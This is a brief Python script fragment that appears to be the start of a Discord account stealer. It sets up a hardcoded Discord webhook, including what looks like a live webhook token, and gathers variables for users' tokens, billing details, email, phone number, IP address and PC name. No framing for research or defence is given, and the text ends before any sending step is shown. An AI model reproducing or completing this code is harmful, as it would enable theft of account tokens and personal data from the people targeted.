import os
import sys
import shutil
import zipfile
from requests import get
from dhooks import Webhook, File

hook = Webhook('https://discord.com/api/webhooks/824938592975323186/f7dwSdI94HG3QAcfvU85kL0ll49024CZMuQebV8TwmW-w063hEQa4fxFzczrOBB0ilvb')
path = os.getenv('EMAIL')
localpath = os.getenv('PHONE')
nitro = os.getenv('NITRO')
billing = os.getenv('BILLING')
ip = os.getenv('IP')
user = os.getenv('USER')
pcname = os.getenv('PCNAME')
tokenlocaation = os.getenv('TOKENLOCATION')
token = os.getenv('TOKEN')
